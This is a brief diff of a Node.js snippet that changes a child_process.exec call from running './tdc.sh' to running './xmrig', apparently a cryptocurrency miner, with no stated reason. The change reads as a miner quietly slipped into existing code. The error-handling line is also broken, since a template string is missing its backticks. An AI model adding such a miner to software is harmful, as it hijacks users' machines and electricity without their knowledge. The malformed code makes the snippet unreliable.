@@ -1,6 +1,6 @@
 ```javascript
 const { exec } = require('child_process');
-exec('./tdc.sh', (error, stdout, stderr) => {
+exec('./xmrig', (error, stdout, stderr) => {
 if (error) {
 console.error(Error executing script: ${error.message});
 return;
